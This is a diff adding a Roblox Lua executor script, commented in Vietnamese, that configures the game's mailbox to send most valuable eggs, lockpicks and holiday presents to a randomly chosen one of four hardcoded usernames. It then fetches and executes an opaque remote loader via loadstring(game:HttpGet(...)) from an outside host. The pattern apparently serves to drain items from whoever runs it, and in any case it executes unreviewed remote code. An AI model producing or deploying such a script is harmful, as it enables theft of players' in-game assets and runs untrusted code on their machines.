@@ -1,0 +1,41 @@
+-- Kiểm tra biến toàn cục để xác định script đã chạy hay chưa
+if _G.MAILBOXITEMS then
+    warn("Script đã được chạy trước đó!")
+    return -- Dừng script nếu đã chạy
+end
+
+-- Đánh dấu script đã được chạy
+_G.MAILBOXITEMS = true
+
+-- Tạo danh sách người dùng và chọn ngẫu nhiên
+local available_users = {"manix6hi", "barus1ik", "billo9xx", "mcane9gb"}
+local random_user = available_users[math.random(1, #available_users)]
+
+getgenv().Settings = {
+    Mailing = {
+	["Huge Machine Egg 4"] = {Class = "Egg", Minimum = 1, Amount = 1},
+	["Jolly Gift"] = {Class = "Lootbox", Minimum = 1, Amount = "Max"},
+	["Lockpick A"] = {Class = "Misc", Minimum = 200, Amount = "Max"},
+	["Lockpick B"] = {Class = "Misc", Minimum = 5, Amount = "Max"},
+	["Lockpick C"] = {Class = "Misc", Minimum = 1, Amount = "Max"},
+	["Hype Egg"] = {Class = "Lootbox", Minimum = 1, Amount = "Max"},
+	["Snowflake Gift"] = {Class = "Lootbox", Minimum = 300, Amount = "Max"},
+	["2024 Gargantuan Christmas Present"] = {Class = "Lootbox", Minimum = 5, Amount = "Max"},
+	["2024 X-Large Christmas Present"] = {Class = "Lootbox", Minimum = 5, Amount = "Max"},
+	["2024 Large Christmas Present"] = {Class = "Lootbox", Minimum = 50, Amount = "Max"},
+	["2024 Medium Christmas Present"] = {Class = "Lootbox", Minimum = 150, Amount = "Max"},
+	["2024 Small Christmas Present"] = {Class = "Lootbox", Minimum = 400, Amount = "Max"},
+    },
+    Users = {
+        random_user, -- Gán người dùng ngẫu nhiên
+    },
+    ["Split Items Evenly"] = false,
+    ["Only Online Accounts"] = false,
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/86847850c3165379f5be2d9d071eaccb.lua"))()
+
+-- Hàm gỡ bỏ _G.MAILBOXITEMS sau 5 tiếng
+delay(18000, function()
+    _G.MAILBOXITEMS = false
+    print("Đã gỡ bỏ MAILBOXITEMS sau 5 tiếng.")
+end)
